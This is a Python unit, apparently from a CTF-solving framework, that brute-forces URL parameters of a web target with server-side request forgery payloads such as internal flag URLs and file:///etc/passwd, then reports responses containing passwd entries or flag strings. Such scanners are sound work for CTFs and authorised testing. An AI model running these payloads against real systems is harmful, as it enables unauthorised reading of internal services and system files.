"""
Server-Side Request Forgery (SSRF) detection.

This unit tests web targets for SSRF vulnerabilities by checking
if URL parameters can be manipulated to access internal services.

Common in modern web CTFs.
"""

from typing import Any, Generator

import requests
import regex as re
from flagr.unit import NotApplicable
from flagr.unit import Unit as BaseUnit


# SSRF test targets
SSRF_TARGETS = [
    "http://127.0.0.1/flag",
    "http://localhost/flag",
    "http://127.0.0.1/flag.txt",
    "http://0.0.0.0/flag",
    "http://[::1]/flag",
    "http://127.0.0.1:8080/",
    "file:///etc/passwd",
    "file:///flag",
    "file:///flag.txt",
]

# URL parameter names commonly vulnerable to SSRF
URL_PARAMS = ["url", "uri", "path", "page", "file", "link", "src", "redirect",
              "target", "fetch", "load", "resource", "ref"]


class Unit(BaseUnit):

    GROUPS = ["web", "ssrf", "injection", "exploit"]
    PRIORITY = 50
    RECURSE_SELF = False
    NO_RECURSE = True

    def __init__(self, *args, **kwargs):
        super(Unit, self).__init__(*args, **kwargs)

        if not self.target.is_url:
            raise NotApplicable("not a URL target")

    def enumerate(self) -> Generator[Any, None, None]:
        for param in URL_PARAMS:
            for target in SSRF_TARGETS:
                yield (param, target)

    def evaluate(self, case: Any):
        """Test for SSRF by injecting internal URLs into parameters."""
        param_name, ssrf_target = case

        try:
            url = self.target.upstream.decode("utf-8", errors="replace")

            # Build test URL with SSRF payload
            separator = "&" if "?" in url else "?"
            test_url = f"{url}{separator}{param_name}={ssrf_target}"

            resp = requests.get(test_url, timeout=10, verify=False, allow_redirects=False)

            # Check for signs of SSRF success
            if resp.status_code == 200:
                content = resp.content
                if b"root:" in content or b"flag{" in content or b"FLAG{" in content or b"ctf{" in content:
                    self.manager.register_data(
                        self,
                        f"SSRF Detected!\n  URL: {test_url}\n  Parameter: {param_name}\n  Target: {ssrf_target}"
                    )
                    self.manager.register_data(self, content)

        except requests.RequestException:
            pass
